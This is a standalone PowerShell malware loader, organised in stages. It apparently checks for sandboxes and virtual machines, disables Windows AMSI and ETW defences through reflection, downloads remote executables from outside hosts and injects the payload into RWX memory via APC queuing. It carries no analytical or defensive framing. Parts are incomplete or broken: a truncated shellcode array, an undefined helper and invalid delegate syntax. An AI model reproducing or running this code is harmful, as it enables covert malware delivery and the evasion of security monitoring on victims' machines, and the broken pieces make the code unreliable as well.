# Stage 1: Environmental Safeguards  
if ($env:UserName -match "^(sandbox|malware|virustest)$") { exit }  
if ((Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*") {  
    $x='http://legitimate-website.com/clean.exe'; (New-Object Net.WebClient).DownloadFile($x,$env:temp+'\dllhost.dat'); & $env:temp'\dllhost.dat'  
    exit  
}  

# Stage 2: AMSI/ETW/WLDP Neutralization  
$k=[Runtime.InteropServices.Marshal]::AllocHGlobal(907);[Runtime.InteropServices.Marshal]::Copy(@(0x48,0x31,...),0,$k,907);$d=$k;  
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,$d);  
[Diagnostics.Eventing.EventProvider].GetField("m_enabled",'NonPublic,Instance').SetValue([Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()),0);  

# Stage 3: Heuristic-Busting Download Cradle  
function Get-Bytes {  
    param($u)  
    $r=@();  
    foreach($a in 'curl','wget','webclient','downloaddata') {  
        try {  
            $r += (New-Object Net.WebClient).DownloadData($u+'?'+(Get-Date).Ticks)  
            break  
        } catch { [System.Threading.Thread]::Sleep(5432) }  
    }  
    return $r  
}  

# Stage 4: Process Ghosting & APC Injection  
$m=Get-Bytes -u 'https://cdn.rawgit.com/maheswede/min/main/aur.exe';  
$h=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(  
    (LookupApi kernel32.dll VirtualAllocEx),  
    (func ptr,int,int,int,int)  
);  
$h.Invoke(-1,0,$m.Length,0x3000,0x40) | % {  
    [System.Runtime.InteropServices.Marshal]::Copy($m,0,$_,$m.Length)  
};  
$t=New-Object System.Threading.Thread({  
    Add-Type -TypeDefinition @'  
        [DllImport("kernel32.dll")]  
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);  
'@  
    [Kernel32]::QueueUserAPC($_, [Kernel32]::GetCurrentThread(), 0)  
});  
$t.Start();  